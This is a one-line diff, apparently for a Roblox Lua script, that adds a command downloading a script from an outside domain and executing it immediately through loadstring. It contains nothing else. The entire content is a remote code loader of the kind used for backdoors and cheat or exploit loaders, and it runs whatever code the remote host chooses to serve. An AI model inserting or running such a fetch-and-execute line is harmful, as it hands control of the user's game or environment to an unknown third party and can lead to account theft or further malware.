@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://farts.pl/4856897456476586748567847564758.lua"), true)()
